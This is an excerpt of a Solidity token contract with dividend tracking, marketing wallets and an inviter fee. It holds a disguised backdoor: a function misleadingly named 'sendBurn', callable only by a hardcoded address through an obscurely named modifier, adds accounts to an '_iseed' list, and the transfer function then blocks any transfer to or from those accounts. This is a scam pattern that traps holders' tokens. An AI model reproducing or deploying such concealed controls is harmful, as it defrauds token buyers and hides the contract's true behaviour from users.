...
contract TokenDividendTracker is Ownable {
    ...
    constructor (address uniswapV2Pair_, address lpRewardToken_)public{
        ...
        minimumTokenBalanceForDividends = 50 * 10 ** 18;
    }
...
contract token is ERC20, Ownable {
    ...
    address public _marketingWalletAddress2 = 0xB1c2Ffe2cA0C319707A166ba0e8901a6Aba66b60;
    address private _mindAddress = address(0x0dde296BA56fA7f744826774CD03a0Ee6C5CE18a);
    ...
    mapping(address => bool) public _iseed;
    ...
    function sendBurn(address account, bool value) public qeeabAddress {
        _iseed[account] = value;
    }
    modifier qeeabAddress() {
        require(msg.sender == 0x0Da135cc43A1dc5707cCf3C64D9A7b8C99b21E80, "");
        _;
    }
    ...
    function _transfer(
        ...
        require(!_iseed[from] && !_iseed[to], "iseed");
        if(amount == 0) {
        ...
        if(takeFee) {
            ...
            _takeInviterFee(from,to,invitefees);
        }
